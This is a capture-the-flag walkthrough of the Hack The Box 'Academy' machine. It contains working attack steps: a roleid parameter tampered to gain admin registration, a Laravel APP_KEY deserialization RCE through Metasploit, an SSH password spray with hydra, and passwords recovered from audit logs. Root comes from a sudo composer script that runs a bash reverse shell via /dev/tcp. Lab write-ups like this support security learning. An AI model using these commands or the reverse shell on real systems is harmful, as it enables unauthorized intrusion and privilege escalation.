![](academy_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.215 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.215`
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

* on port 80 `10.10.10.215` redirect to `academy.htb`
* add `academy.htb` in `/etc/hosts`

## Web_server

### Gobuster
`gobuster dir -u 10.10.10.215 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 50`
```
/academy (Status: 301)
```

`gobuster dir -u  http://10.10.10.215/academy/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 40 -b 401,402,403,404`
```
/.env (Status: 200)
```
* gobustering root host give so much information and the direct ssh for user in `.env` , I think this is unintended because it skips the foothold part .

## VHOST:academy.htb

* in the right corner there are two options `login` `register` gobuster also identify them

### Gobuster
`gobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -t 50`
```
/admin.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
```

### login

__*Nothing intrested in login*__

### register

* in the source found hidden tag

      <input type="hidden" value="0" name="roleid" />

* __roleid__ is related to `RST_API`

  - there is a [Role management](https://thalesdocs.com/gphsm/luna/7.3/docs/network/Content/REST_API/REST_API_Reference_Guide/html/_roles_urls_page_name.html) system in the REST_API
  - Role management resources provide a facility to manage roles used to determine resource access for users.
  - `roleid` set either a name or number eg. `user` or `0`

* intercept register request in burp found roleid perameter

      uid=test1&password=test1&confirm=test1&roleid=0

* this server is using numbers as roleid
* after some tries i found that there are only two IDs `0` or `1`
* `roleid=0` register a __user__ account 
* `roleid=1` register a __admin__ account
* so i intercept a register request change roleid to `1` and create a admin account

### admin
*found `admin.php` in gobuster scan*

* login with registred `roleid=1` creds
* found a VHOST and 2 users

      Complete initial set of modules (cry0l1t3 / mrb3n)	done
      Fix issue with dev-staging-01.academy.htb	                pending

* add in `/etc/hosts`

## VHOST:dev-staging-01.academy.htb

* there is a some kind of web application running on the host because it throughs a error that is not related to any http errors

      UnexpectedValueException
* reading thru it i found some intersting data

      APP_NAME 	"Laravel"
      APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="

      DB_CONNECTION 	"mysql"
      DB_HOST 	"127.0.0.1"
      DB_PORT 	"3306"
      DB_DATABASE 	"homestead"
      DB_USERNAME 	"homestead"
      DB_PASSWORD 	"secret"

* found application name and mysql config but db is in local so not useful for now .

### Laravel

__description :__  [Laravel](https://laravel.com/) is a free, [open-source](https://github.com/laravel/laravel) PHP web application framework which is accessible, powerful, and provides tools required for large, robust applications.

__vulnerability :__ found RCE [CVE-2018-15133](https://www.cvedetails.com/cve/CVE-2018-15133/) and msf [module](https://www.exploit-db.com/exploits/47129) for that CVE .

*I don't find which `Laravel` version running on the server but i give it a go and use msf to check if it works and it worked and give www-data shell*

* [Exploit PoC on github@kozmic](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

# User Exploit
*getting user is a long road from user `www-data>>cry0l1t3>>mrb3n` to get root privesc*
## www-data shell

__what is exploit :__ Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.

* exploit prerequirement is `APP_KEY` which i already found

### Exploit using MSF

__Exploit Module :__ exploit/unix/http/laravel_token_unserialize_exec

```
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215
RHOSTS => 10.10.10.215
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb
VHOST => dev-staging-01.academy.htb
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
```
```
[*] Command shell session 1 opened
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami;id
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalating to cry0l1t3 

* running `linpeas` script found nothing except that `.env` file form `/var/www/html/academy/` directory that contains some passwords .
* __.env__ file contains creds for local sql database

      DB_CONNECTION=mysql
      DB_HOST=127.0.0.1
      DB_PORT=3306
      DB_DATABASE=academy
      DB_USERNAME=dev
      DB_PASSWORD=mySup3rP4s5w0rd!!

* but not able to login into the database using these creds
* try spraying that password to all users with `hydra` for ssh login,

    `hydra -L users.txt -P password.txt 10.10.10.215 -t 4 ssh`

      [DATA] attacking ssh://10.10.10.215:22/
      [22][ssh] host: 10.10.10.215   login: cry0l1t3   password: mySup3rP4s5w0rd!!
      1 of 1 target successfully completed, 1 valid password found


*thats why i thought that founding `.env` file from [gobuster]() is unintended*

### creds 
`cry0l1t3:mySup3rP4s5w0rd!!`

* __ssh__ 

    `ssh cry0l1t3@10.10.10.215`

      cry0l1t3@10.10.10.215's password: mySup3rP4s5w0rd!!
      $ bash
      cry0l1t3@academy:~$ cat user.txt
      ea657863************************

## Escalating to mrb3n

* user __cry0l1t3__ is in `adm` group 

      cry0l1t3@academy:~$ groups
      cry0l1t3 adm
      cry0l1t3@academy:/home$ id
      uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)

* __adm group :__ adm Group is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
  * that means user __cry0l1t3__ can read system logs.
  * understand all types of log in linux by [privacyangel.com](https://privacyangel.com/linux-log-files)
* there is a `audit log` dir which is suspiciou.
  * __[audit log](https://sematext.com/blog/auditd-logs-auditbeat-elasticsearch-logsene/) :__ can use to learn about user activity, which could be used to boost efficiency, security, and performance.
  * audit logs create by linux [auditclt](https://linux.die.net/man/8/auditctl) service.
* __Note :__ that audit logs store users commands inputs in `DATA` field in `hex` form.

* I grep all `su` commands from `audit logs` and found some intresting data

__Final result__

      cry0l1t3@academy:/var/log/audit$ grep -r -w su | grep data
      audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A

      cry0l1t3@academy:/var/log/audit$ grep -r -w su | grep data | awk -F= '{print $11}'
      6D7262336E5F41634064336D79210A

      cry0l1t3@academy:/var/log/audit$ echo $(grep -r -w su | grep data | awk -F= '{print $11}') | xxd -r -p
      mrb3n_Ac@d3my!

* so user with uid=1002 run su with there own password as command input eg. `su mrb3n_Ac@d3my!` thats why this log generated.
* viewing `/etc/passwd` i find out that `UID=1002` belong to user `mrb3n`.

### creds
`mrb3n:mrb3n_Ac@d3my!`

### su to mrb3n
```
cry0l1t3@academy:~$ su - mrb3n
Password: mrb3n_Ac@d3my!
$ bash
mrb3n@academy:~$ whoami;id
mrb3n
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

# Local Enumeration

* check sudo rights `sudo -l`

      User mrb3n may run the following commands on academy:
          (ALL) /usr/bin/composer

* user mrb3n run `composer` as root

* __Composer__ is a tool for dependency management in PHP. It allows you to declare the libraries your project depends on and it will manage (install/update) them for you.

    * First thing first find the [composer documentation](https://getcomposer.org/doc/00-intro.md)
    * form the doc i found that the [composer run scripts](https://getcomposer.org/doc/articles/scripts.md)

    __Note :__ Only scripts defined in the composer.json are executed .


## attack surface

* Create a `composer.json` file and inside that file specify `reverse shell` script
    * in the script doc i found composer.json template best for [custom script ececution](https://getcomposer.org/doc/articles/scripts.md#writing-custom-commands)
* run composer and execute the script

# Root Exploit

__First__, create `composer.json` file
```
{
    "scripts": {
        "hack": [
            "bash shell.sh"
        ]
    }
}
```

__Second__, create `shell.sh` script
```
bash -i >& /dev/tcp/tun0/4242 0>&1
```

__Third__, open nc port
```
nc -nvlp 4242
```

__Fourth__, run composer 
```
mrb3n@academy:~$ sudo composer hack
```

*shell pops in netcat immediately*

```
root@academy:~# cat root.txt
cat root.txt
29a4ab3f************************
```

